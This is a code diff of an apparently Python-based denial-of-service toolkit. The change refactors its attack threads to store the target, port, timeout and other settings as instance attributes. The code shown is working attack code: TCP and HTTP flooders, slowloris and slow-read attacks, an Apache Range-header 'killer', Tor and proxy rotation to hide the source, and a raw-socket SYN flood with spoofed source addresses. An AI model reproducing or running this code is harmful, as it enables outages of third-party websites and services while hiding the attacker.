@@ -134,24 +134,32 @@ class tcflood(threading.Thread):
  def run(self):
   global counter
   global stop
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
+  self.amp=amp
+  self.speed=speed
+  self.packs2=packs2
+  self.packs1=packs1
   time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout=(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout=(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target,port))
-    if (port==443) or (port==8443):
+    s.connect((self.target,self.port))
+    if (self.port==443) or (self.port==8443):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for l in range(random.randint(packs2,packs1)):
+    for l in range(random.randint(self.packs2,self.packs1)):
      if stop==True:
       break
      m=''
      for li in range(30,50): 
       m+=str(random.randint(1,1000000))+random.choice(lis)
-     m=m*amp
+     m=m*self.amp
      try:
       if stop==True:
         break
@@ -161,7 +169,7 @@ class tcflood(threading.Thread):
        print("[!]Packets: {} | Bytes: {}".format(counter,len(m)))
      except Exception as dx:
       pass
-     time.sleep(speed)
+     time.sleep(self.speed)
     s.close()
    except Exception as e:
     pass
@@ -231,18 +239,26 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
 class htflood(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
+  self.amp=amp
+  self.speed=speed
+  self.packs2=packs2
+  self.packs1=packs1
   time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout=(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout=(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target,port))
-    if ((port==443) or (port==8443)):
+    s.connect((self.target,self.port))
+    if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for fg in range(random.randint(packs2,packs1)):
+    for fg in range(random.randint(self.packs2,self.packs1)):
      if stop==True: 
        break
      pa=random.choice(paths)
@@ -274,7 +290,7 @@ class htflood(threading.Thread):
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
-      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
+      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
      else:
       req="POST"
       k=''
@@ -286,8 +302,8 @@ class htflood(threading.Thread):
       j=''
       for x in range(0,random.randint(11,16)):
        j+=random.choice(lis)
-      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
+      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*self.amp,100*self.amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if stop==True:
         break
@@ -297,7 +313,7 @@ class htflood(threading.Thread):
        print("[!]Request: {} | Type: {} | Bytes: {}".format(counter,req,len(m)))
      except:
       pass
-     time.sleep(speed)
+     time.sleep(self.speed)
     s.close()
    except:
     pass
@@ -387,6 +403,13 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
 class prflood(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.amp=amp
+  self.speed=speed
+  self.packs2=packs2
+  self.packs1=packs1
   time.sleep(2)
   while (stop!=True):
    try:
@@ -407,11 +430,11 @@ class prflood(threading.Thread):
     elif (z in [17,18,19,20]):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
-     s.settimeout(timeout)
-    s.connect((target,port))
-    if ((port==443) or (port==8443)):
+     s.settimeout(self.timeout)
+    s.connect((self.target,self.port))
+    if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for fg in range(random.randint(packs2,packs1)):
+    for fg in range(random.randint(self.packs2,self.packs1)):
      if stop==True:
       break
      for l in range(random.randint(1,5)):
@@ -443,7 +466,7 @@ class prflood(threading.Thread):
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
-      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
+      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
      else:
       req="POST"
       k=''
@@ -452,8 +475,8 @@ class prflood(threading.Thread):
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
-      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*amp,100*amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
+      par =(k*random.randint(5,30))+str(random.randint(1,100000))+'='+(j*random.randint(50*self.amp,100*self.amp))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if stop==True:
         break
@@ -463,7 +486,7 @@ class prflood(threading.Thread):
        print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,counter,req,len(m)))
      except:
       pass
-     time.sleep(speed)
+     time.sleep(self.speed)
     s.close()
    except:
     pass
@@ -552,21 +575,25 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
   return counter
 class reqpost(threading.Thread):
  def run(self):
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
   time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout(timeout)
+    if self.tor==False:
+     s.settimeout(self.timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target,port))
+    s.connect((self.target,self.port))
     if prints==True:
-     print("Connected to {}:{}...".format(target,port))
-    if ((port==443) or (port==8443)):
+     print("Connected to {}:{}...".format(self.target,self.port))
+    if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     q=random.randint(10000,15000)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target))
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
     for i in range(q):
      if stop==True:
       break
@@ -633,6 +660,9 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True)
    break
 class pham(threading.Thread):
  def run(self):
+  self.target=target
+  self.port=port
+  self.timeout=timeout
   global counter
   time.sleep(2)
   while (stop!=True):
@@ -655,12 +685,12 @@ class pham(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout(timeout)
-    s.connect((target,port))
-    if ((port==443)or(port==8443)):
+     s.settimeout(self.timeout)
+    s.connect((self.target,self.port))
+    if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     q=random.randint(10000,15000)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target))
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
     for i in range(q):
      if stop==True:
       break
@@ -786,18 +816,21 @@ def torswitch2(new=30,password=None,p=9051,logs=True):
 class xer(threading.Thread):
  def run(self):
   x=pointer
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
   time.sleep(2)
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.settimeout(timeout)
-    s.connect((target,port))
+    s.connect((self.target,self.port))
     if prints==True:
-     print("[Connected to {}:{}]".format(target,port))
+     print("[Connected to {}:{}]".format(self.target,self.port))
     while (stop!=True):
      try:
       s.send("\x00".encode('utf-8'))
@@ -862,6 +895,9 @@ class pxer(threading.Thread):
  def run(self):
   global counter
   x=pointer
+  self.target=target
+  self.port=port
+  self.timeout=timeout
   time.sleep(2)
   while (stop!=True):
    try:
@@ -883,8 +919,8 @@ class pxer(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout(timeout)
-    s.connect((target,port))
+     s.settimeout(self.timeout)
+    s.connect((self.target,self.port))
     while (stop!=True):
      s.send("\x00".encode('utf-8'))
      time.sleep(.2)
@@ -950,16 +986,25 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
    break
 class slrd(threading.Thread):
  def run(self):
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
+  self.speed=speed
+  self.rre2=rre2
+  self.rre1=rre1
+  self.sre1=sre1
+  self.sre2=sre2
   time.sleep(2)
   while (stop!=True):
    try: 
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target,port))
-    if ((port==443)or(port==8443)):
+    s.connect((self.target,self.port))
+    if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     while (stop!=True):
      pa=random.choice(paths)
@@ -977,16 +1022,16 @@ class slrd(threading.Thread):
      try:
       g=random.randint(1,2)
       if g==1:
-       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target))
+       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
       else:
        q='q='
        for i in range(10,random.randint(20,50)):
         q+=random.choice(lis)
-       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,q).encode('utf-8'))
-      d=s.recv(random.randint(rre1,rre2))
+       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
+      d=s.recv(random.randint(self.rre1,self.rre2))
       if prints==True:
        print("Received: {}".format(d))
-      time.sleep(random.randint(sre1,sre2))
+      time.sleep(random.randint(self.sre1,self.sre2))
      except:
       break
     s.close()
@@ -1047,6 +1092,13 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
 class apa(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
+  self.packs2=packs2
+  self.packs1=packs1
+  self.speed=speed
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1054,18 +1106,18 @@ class apa(threading.Thread):
     for x in range(1,random.randint(1200,1300)):
      apache+=',5-'+str(x)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target, port))
-    if ((port==443)or(port==8443)):
+    s.connect((self.target, self.port))
+    if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for x in range(random.randint(packs2,packs1)):
+    for x in range(random.randint(self.packs2,self.packs1)):
      if stop==True:
       break
-     s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format(random.choice(paths),target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
-     time.sleep(speed)
+     s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(rando.randint(1,1000000))+str(rando.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
+     time.sleep(self.speed)
      counter+=1
      if prints==True:
       print("Requests sent: {}".format(counter))
@@ -1074,6 +1126,12 @@ class apa(threading.Thread):
 class ptc(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.sre1=sre1
+  self.sre2=sre2
+  self.speed=speed
   time.sleep(2)
   x=pointer
   while (stop!=True):
@@ -1096,8 +1154,8 @@ class ptc(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout(timeout)
-    s.connect((target,port))
+     s.settimeout(self.timeout)
+    s.connect((self.target,self.port))
     while (stop!=True):
      pa=random.choice(paths)
      if "?" in pa:
@@ -1108,15 +1166,15 @@ class ptc(threading.Thread):
      try:
       g=random.randint(1,2)
       if g==1:
-       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target).encode('utf-8'))
+       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
       else:
        q='q='
        for i in range(10,random.randint(20,50)):
         q+=random.choice(lis)
-       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,q).encode('utf-8'))
+       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
       if prints==True:
        print("Slow-->{}".format(ipp))
-      time.sleep(random.randint(sre1,sre2))
+      time.sleep(random.randint(self.sre1,self.sre2))
      except:
       break
     s.close()
@@ -1244,6 +1302,10 @@ def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,int
 class loris(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
   ls=[]
   if prints==True:
    print("\tBuilding sockets...")
@@ -1251,12 +1313,12 @@ class loris(threading.Thread):
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if tor==False:
-     s.settimeout(timeout)
-    if tor==True:
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((target, port))
-    if ((port==443)or(port==8443)):
+    s.connect((self.target, self.port))
+    if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     pa=random.choice(paths)
     q=''
@@ -1334,6 +1396,9 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
 class plor(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.port=port
+  self.timeout=timeout
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1355,9 +1420,9 @@ class plor(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout=(timeout)
-    s.connect((target,port))
-    if ((port==443)or(port==8443)):
+     s.settimeout=(self.timeout)
+    s.connect((self.target,self.port))
+    if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     pa=random.choice(paths)
     q=''
@@ -1438,6 +1503,8 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
 class phu(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.timeout=timeout
   global httplist
   global stop
   time.sleep(2)
@@ -1459,7 +1526,7 @@ class phu(threading.Thread):
     proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
     opener = urllib2.build_opener(proxy) 
     urllib2.install_opener(opener)
-    urllib2.urlopen("http://"+target+u,timeout=timeout)
+    urllib2.urlopen("http://"+self.target+u,timeout=self.timeout)
     if stop==True:
         break
     counter+=1
@@ -1470,6 +1537,8 @@ class phu(threading.Thread):
 class hu(threading.Thread):
  def run(self):
   global counter
+  self.target=target
+  self.timeout=timeout
   global stop
   time.sleep(2)
   while (stop!=True):
@@ -1488,7 +1557,7 @@ class hu(threading.Thread):
      else:
       jo='?' 
      u+=jo+q+"="+s
-     request = urllib2.Request('http://'+target+u)
+     request = urllib2.Request('http://'+self.target+u)
      request.add_header('User-Agent', random.choice(ua))
      request.add_header('Cache-Control', 'no-cache')
      request.add_header('Accept',random.choice(a))
@@ -1498,9 +1567,9 @@ class hu(threading.Thread):
      request.add_header('Referer', random.choice(referers) +p)
      request.add_header('Keep-Alive', random.randint(100,500))
      request.add_header('Connection', 'keep-alive')
-     request.add_header('Host',target)
+     request.add_header('Host',self.target)
      try:
-      urllib2.urlopen(request,timeout=timeout)     
+      urllib2.urlopen(request,timeout=self.timeout)     
       if stop==True:
         break
       counter+=1
@@ -1628,21 +1697,35 @@ def checksum(msg):
 class sflood(threading.Thread): 
  def run(self):
   global counter
+  dip=target
+  self.target=target
+  self.port=port
+  self.synf=synf
+  self.rstf=rstf
+  self.pshf=pshf
+  self.ackf=ackf
+  self.urgf=urgf
+  self.finf=finf
+  self.tcpf=tcpf
+  self.winds=winds
+  self.paylo=paylo
+  self.maxttl=maxttl
+  self.minttl=minttl
+  self.amp=amp
   time.sleep(2)
   while (stop!=True):
    try:
-    dip=target
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     sp=random.randint(1024,65500)
-    if paylo==False:
+    if self.paylo==False:
      urd=''
      req='None'
     else:
-     if tcpf==True:
+     if self.tcpf==True:
       urd=''
       req='TCP'
-      for x in range(random.randint(1*amp,3*amp)):
+      for x in range(random.randint(1*self.amp,3*self.amp)):
        urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
       if len(urd)>1400:
        urd=urd[0:1400]
@@ -1665,7 +1748,7 @@ class sflood(threading.Thread):
        kl=random.randint(1,2)
        if kl==1:
         req="GET"
-        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
+        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
        else:
         req="POST"
         k=''
@@ -1678,21 +1761,21 @@ class sflood(threading.Thread):
         for x in range(0,random.randint(11,31)):
          j+=random.choice(lis)
         par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
+        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
     leng=len(urd)
     urd=urd.encode('utf-8')
     sip=getip()
     ips = socket.inet_aton(sip)
     ipd = socket.inet_aton(dip)
     iphv = (4 << 4) + 5
-    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(minttl,maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
+    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
     tcr = (5 << 4) + 0
-    tf = finf + (synf << 1) + (rstf << 2) + (pshf <<3) + (ackf << 4) + (urgf << 5)
-    if winds=='null':
+    tf = self.finf + (self.synf << 1) + (self.rstf << 2) + (self.pshf <<3) + (self.ackf << 4) + (self.urgf << 5)
+    if self.winds=='null':
      windf=0
-    if winds=="random":
+    if self.winds=="random":
      windf=random.randint(0,65535)
-    thd = pack('!HHLLBBHHH' , sp, port, 0 , ackf, 5, tf, socket.htons(windf) , 0, 0)
